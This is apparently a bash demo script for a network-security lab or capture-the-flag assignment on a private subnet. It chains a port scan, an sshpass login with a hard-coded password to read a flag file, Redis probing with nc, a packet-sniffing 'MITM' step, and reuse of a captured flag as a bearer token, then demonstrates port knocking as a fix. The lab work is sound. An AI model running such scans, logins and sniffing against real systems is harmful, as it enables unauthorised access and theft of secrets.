
# All possible ports 1-65535(16-bits)
# All possible target addresses 172.20.0.0/16, i.e. 172.20.0.0-172.20.255.255

# We tested the first 10000 ports using tcp and first 32 addresses and 
# received three additional services, hence did not test further.

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'  # reset/no color

# # echo -e "${RED}This is red${NC}"
# # echo -e "${GREEN}This is green${NC}"
# # echo -e "${YELLOW}This is yellow (bold)${NC}"

# # TCP Scan Ports
echo -e "${YELLOW}Task 1.1: Develop a Port Scanner\n(TCP Scanner Working...)${NC}"
cd port_scanner
python3 scanner.py \
    --target 172.20.0.0/27 \
    --ports 1-10000 \
    --threads 3000 \
    --scan-type tcp \
    --output json \
    --output-file tcp_scan_ports.json

# UDP Scan Ports Code also supported but not required for this assigment
# python3 scanner.py \
#     --target 172.20.0.0/27 \
#     --ports 1-10000 \
#     --threads 1000 \
#     --scan-type udp \
#     --output json \
#     --output-file udp_scan_ports.json

echo -e "${RED}Press Enter to continue...${NC}"
read

# After obtaining service details, we ran curl for HTTPS based open ports and nc for all other open ports recorded.
echo -e "${YELLOW}Task 1.2: Discover Hidden Services\n(Probing Open Ports to find services...)${NC}"
read
python3 probe_ports.py tcp_scan_ports.json -o services.json

echo -e "${RED}Press Enter to continue...${NC}"
read

# Three Additional Services Recorded:

# Service 1 (172.20.0.20:2222) - SSH service
echo -e "${YELLOW}Additional Service 1 (172.20.0.20:2222) - SSH service${NC}"
# ssh -p 2222 sshuser@172.20.0.20
# SecurePass2024!
# cat ~/secrets/flag2.txt
read
sshpass -p 'SecurePass2024!' \
  ssh -p 2222 -o StrictHostKeyChecking=no sshuser@172.20.0.20 \
  'cat ~/secrets/flag2.txt'

read
echo -e "${RED}Flag 2 Captured. Press Enter to continue...${NC}"
read

# Service 2 (172.20.0.21:8888) - HTTPS service
echo -e "${YELLOW}Additional Service 2 (172.20.0.21:8888) - HTTPS service${NC}"
read
curl -v 172.20.0.21:8888 | jq .
echo -e "${RED}Flag 1 is here but authentication required!${NC}"

echo -e "${RED}Press Enter to continue...${NC}"
read

# Service 3 (172.20.0.22:6379) - REDIS Servis
echo -e "${YELLOW}Additional Service 3 (172.20.0.22:6379) - REDIS Servis${NC}"
read
nc -vn 172.20.0.22 6379 << 'EOF'
PING
INFO server
QUIT
EOF

echo -e "${RED}Press Enter to continue...${NC}"
read

# Man in the Middle Attack
echo -e "${YELLOW}Task 2.1: Network Traffic Analysis\n(MITM Attack...)${NC}"
cd ../mitm
# Go to http://172.20.0.1:5001/api/secrets
echo -e "${RED}http://172.20.0.1:5001/api/secrets${NC}"
sudo python3 tcpdump.py
echo -e "${RED}MITM Flag Obtained: FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}${NC}"
echo -e "${RED}Press Enter to continue...${NC}"
read

# Use this obtained Flag for Authentication of HTTP service
echo -e "${YELLOW}Task 2.2: Capture Flag 3 (172.20.0.21:8888 Authentication Required...)${NC}"
read

curl -s -v \
  -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" \
  http://172.20.0.21:8888/flag | jq .
echo -e "${RED}Flag 3 Captured! Press Enter to continue...${NC}"
read

set -euo pipefail

TARGET_IP=${1:-172.20.0.40}
SEQUENCE=${2:-"1234,5678,9012"}
PROTECTED_PORT=${3:-2222}

echo -e "${YELLOW}Part 3 Fix 1: Port Knocking (Protecting SSH server on 172.20.0.40:2222)${NC}"
read

echo "[1/6] Attempting protected port before knocking, 5s timeout"
echo -e "${RED}"
nc -z -v -w 5 "$TARGET_IP" "$PROTECTED_PORT" || true
echo -e "${NC}"


echo "[2/6] Sending knock sequence: $SEQUENCE. Press enter to continue..."
read
for PORT in ${SEQUENCE//,/ }; do
  echo "Knocking $TARGET_IP:$PORT"
  nc -z "$TARGET_IP" "$PORT" || true
  sleep 0.3
done

echo ""
echo "[3/6] Attempting protected port after knocking"
echo -e "${GREEN}"
nc -z -v -w 5 "$TARGET_IP" "$PROTECTED_PORT" || true
echo -e "${NC}"

echo "Sleeping for 15s to reset protection..."
sleep 15

echo ""
echo "[5/6] Attempting protected port again after 15s protection timeout. Press enter to try again..."
read
echo -e "${RED}"
nc -z -v -w 5 "$TARGET_IP" "$PROTECTED_PORT" || true
echo -e "${NC}"

echo "[5/6] Attempting protected port again but with wrong knocking sequence. Press enter to continue..."
read
echo "Sending knock sequence: 1234,9012,5678"
for PORT in 1234 9012 5678; do
  echo "Knocking $TARGET_IP:$PORT"
  nc -z "$TARGET_IP" "$PORT" || true
  sleep 0.3
done

echo ""
echo "[6/6] Attempting protected port after knocking"
echo -e "${RED}"
nc -z -v -w 5 "$TARGET_IP" "$PROTECTED_PORT" || true
echo -e "${NC}"